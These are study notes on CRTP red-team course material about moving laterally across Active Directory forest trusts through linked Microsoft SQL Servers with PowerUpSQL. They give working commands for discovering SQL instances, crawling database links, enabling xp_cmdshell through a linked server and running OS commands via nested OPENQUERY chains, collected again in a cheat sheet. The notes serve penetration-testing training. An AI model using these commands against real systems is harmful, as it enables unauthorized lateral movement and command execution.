Trust Abuse -- MSSQL Servers

Date: 17 August 2026
Topic: Trust Abuse -- MSSQL Servers
Tool: PowerUpSQL
Repository: https://github.com/NetSPI/PowerUpSQL

1. Overview

Microsoft SQL Server instances are commonly deployed throughout
Windows/Active Directory environments. They can provide useful
opportunities for lateral movement because domain users can be
mapped to database roles and SQL Server instances can have relationships
with other SQL servers through database links.

The supplied CRTP material focuses on discovering MSSQL instances,
checking accessibility, gathering server information, identifying linked
SQL servers, enumerating nested links, and executing commands through
SQL Server links.

2. PowerUpSQL

For MSSQL and PowerShell-based enumeration, the material uses
PowerUpSQL.

PowerUpSQL is used for:

SQL Server discovery

Accessibility testing

SQL Server information gathering

Database-link discovery

Database-link crawling

Query execution through linked SQL instances

3. Discovery -- SPN Scanning

Find SQL Server Instances

Command

Get-SQLInstanceDomain

Purpose

Discovers SQL Server instances in the domain using SPN-based discovery.

Conceptually:

Domain
  │
  ├── SQL Server 1
  ├── SQL Server 2
  ├── SQL Server 3
  └── SQL Server 4

The first objective is therefore to identify the SQL Server
infrastructure available in the domain.

4. Check SQL Server Accessibility

After discovering SQL instances, the next step is to determine which
instances can be accessed.

Command

Get-SQLConnectionTestThreaded

The discovered instances can also be piped into the connection test:

Command

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

Purpose

This helps determine which discovered SQL Server instances are
accessible from the current context.

The methodology is:

Discover SQL Instances
        ↓
Test Connectivity
        ↓
Identify Accessible Servers

5. Gather SQL Server Information

Once accessible instances have been identified, gather additional
information.

Command

Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

Purpose

Collects information about the discovered SQL Server instances.

This helps build a better understanding of the SQL infrastructure before
investigating relationships between servers.

6. Database Links

A database link allows a SQL Server to access external data sources
such as:

Other SQL Servers

OLE DB data sources

In the case of linked SQL Servers, the relationship can allow queries
and stored procedures to be executed against the linked server.

An important point from the CRTP material is:

Database links can work across forest trusts.

This makes SQL Server links particularly interesting when investigating
trust relationships.

Conceptually:

Forest A
   │
   │ Trust
   ▼
Forest B

SQL Server A
     │
     │ Database Link
     ▼
SQL Server B

7. Search for Database Links

PowerUpSQL can be used to search for links from a SQL Server.

Command

Get-SQLServerLink -Instance dcorp-mssql -Verbose

This searches for remote SQL Server links from the specified instance.

Manual Enumeration

The SQL Server system table can also be queried manually:

Command

select * from master..sysservers

This can provide information about configured linked servers.

8. Enumerating Database Links with OPENQUERY

SQL Server's OPENQUERY() function can be used to execute a query
against a linked database.

Command

select * from openquery("dcorp-sql1",'select * from master..sysservers')

Methodology

Initial SQL Server
       │
       ▼
Linked SQL Server
       │
       ▼
Query sysservers
       │
       ▼
Discover Additional Links

This is important because the initial SQL Server may not be the final
destination.

9. SQL Server Link Crawling

PowerUpSQL provides functionality to automatically crawl SQL Server
links.

Command

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose

Purpose

This is used to enumerate links from the initial SQL Server and identify
additional SQL Server relationships.

Conceptually:

dcorp-mssql
     │
     ├── dcorp-sql1
     │       │
     │       └── dcorp-mgmt
     │
     └── Other Links

10. Nested Database Links

OPENQUERY() queries can be chained.

This means a query can access a linked server and then use another
linked server from that server.

Example

select * from openquery(
    "dcorp-sql1",
    'select * from openquery(
        "dcorp-mgmt",
        ''select * from master..sysservers''
    )'
)

Concept

Initial SQL Server
       │
       ▼
   dcorp-sql1
       │
       ▼
   dcorp-mgmt
       │
       ▼
Additional SQL Links

These nested relationships can create a path through multiple SQL Server
instances.

11. Executing Commands Through SQL Server

The supplied material notes that command execution on the target server
requires either:

xp_cmdshell to already be enabled, or

rpcout to be enabled so that xp_cmdshell can be enabled through
the linked server.

The example supplied in the material is:

Command

EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"

Purpose

The query is executed against the specified linked SQL Server.

The material specifically notes that this approach depends on rpcout
being enabled.

12. Execute a Query on a Specific Target

PowerUpSQL's -QueryTarget parameter can be used to specify which SQL
Server in the link chain should receive the query.

Command

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql

Why -QueryTarget Matters

Without -QueryTarget, the supplied material notes that the command
attempts to use xp_cmdshell on every link in the chain.

With:

-QueryTarget eu-sql

the query is directed toward the specified SQL Server instance.

13. Nested Link Command Execution

The material also demonstrates that OS commands can be executed through
nested SQL Server links using chained OPENQUERY() statements.

Supplied Example

select * from openquery(
    "dcorp-sql1",
    'select * from openquery(
        "dcorp-mgmt",
        ''select * from openquery(
            "eu-sql.eu.eurocorp.local",
            ''''select @@version as version;
            exec master..xp_cmdshell "powershell whoami"
            ''''
        )''
    )'
)

The important concept is not memorizing the quotation marks.

The important concept is:

dcorp-mssql
     │
     ▼
dcorp-sql1
     │
     ▼
dcorp-mgmt
     │
     ▼
eu-sql.eu.eurocorp.local
     │
     ▼
xp_cmdshell
     │
     ▼
OS Command

14. Complete Methodology

The overall MSSQL trust-abuse methodology from the supplied material is:

1. Discover SQL Server instances
             ↓
2. Test accessibility
             ↓
3. Gather SQL Server information
             ↓
4. Identify database links
             ↓
5. Enumerate linked servers
             ↓
6. Crawl the SQL Server links
             ↓
7. Identify nested links
             ↓
8. Identify a useful target
             ↓
9. Execute queries through the link
             ↓
10. Where the lab configuration permits,
    execute OS commands

15. Attack Path Mental Model

The key idea is that SQL Server links can create a lateral-movement
path across trust boundaries.

Low-Privilege Domain User
          │
          ▼
   Accessible MSSQL
          │
          ▼
   Database Link
          │
          ▼
   Another SQL Server
          │
          ▼
    Nested Link
          │
          ▼
 SQL Server in another
    trusted forest
          │
          ▼
 Query / Command Execution

The important relationship is:

AD trust + SQL Server links can combine to create a path between
otherwise separate environments.

16. Command Cheat Sheet

Discover SQL Instances

Get-SQLInstanceDomain

Test Accessibility

Get-SQLConnectionTestThreaded

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

Gather SQL Server Information

Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

Find SQL Server Links

Get-SQLServerLink -Instance dcorp-mssql -Verbose

Manually Enumerate Links

select * from master..sysservers

Query a Linked Server

select * from openquery("dcorp-sql1",'select * from master..sysservers')

Crawl SQL Server Links

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose

Configure xp_cmdshell in the Supplied Lab Scenario

EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"

Execute Query Against Specific Target

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql

17. Important Parameters

Parameter / Function                Purpose

Get-SQLInstanceDomain             Discover SQL Server instances in
the domain

Get-SQLConnectionTestThreaded     Test SQL Server connectivity

Get-SQLServerInfo                 Gather SQL Server information

Get-SQLServerLink                 Find SQL Server links

Get-SQLServerLinkCrawl            Crawl SQL Server link relationships

OPENQUERY()                       Execute queries against linked
servers

master..sysservers                Query SQL Server link information

xp_cmdshell                       Execute OS commands from SQL Server
when enabled

18. Key Concepts to Remember

SQL Server Discovery

Use SPN-based discovery to identify SQL Server instances.

Accessibility

Not every discovered SQL Server is necessarily accessible. Test
connectivity after discovery.

Database Links

A SQL Server can have relationships with other SQL Servers and external
data sources.

Cross-Forest Links

SQL Server database links can operate across forest trusts, making them
relevant to trust-abuse scenarios.

Nested Links

Links can point to additional SQL Servers, creating chains such as:

SQL1 → SQL2 → SQL3 → SQL4

OPENQUERY

OPENQUERY() allows queries to be executed against a linked server.

xp_cmdshell

When available/enabled in the lab configuration, xp_cmdshell can
execute operating-system commands from SQL Server.

19. CRTP Mental Model

Don't memorize the huge nested OPENQUERY() statement.

Remember the methodology:

DISCOVER
   ↓
ACCESS
   ↓
ENUMERATE
   ↓
FIND LINKS
   ↓
CRAWL LINKS
   ↓
FOLLOW NESTED LINKS
   ↓
REACH TARGET
   ↓
EXECUTE QUERY

The most important chain to remember is:

Domain Enumeration → MSSQL Discovery → Accessible SQL → Database
Links → Nested Links → Cross-Trust SQL Server → Command Execution

20. Revision Questions

Before moving to the next topic, make sure you can answer:

Why are MSSQL servers useful for lateral movement?

What does Get-SQLInstanceDomain discover?

Why do we test SQL Server accessibility after discovery?

What information does Get-SQLServerInfo provide?

What is a database link?

Why are database links interesting across forest trusts?

How can SQL Server links be enumerated manually?

What does OPENQUERY() do?

What is the purpose of Get-SQLServerLinkCrawl?

What is a nested SQL Server link?

What is the purpose of -QueryTarget?

Under what condition can xp_cmdshell be used in the supplied lab?

What role does rpcout play in the supplied scenario?

How can a SQL Server link become a lateral-movement path?

What is the complete attack chain from SQL discovery to command
execution?

21. One-Line Memory Aid

Discover → Test → Gather → Find Links → Crawl → Follow Nested Links →
Target → Execute

Lab Note

All commands and examples in this document are based on the supplied
CRTP training material and should be treated as authorized
lab/assessment procedures. Configuration-dependent behavior such as
rpcout and xp_cmdshell should be verified in the specific lab
environment.
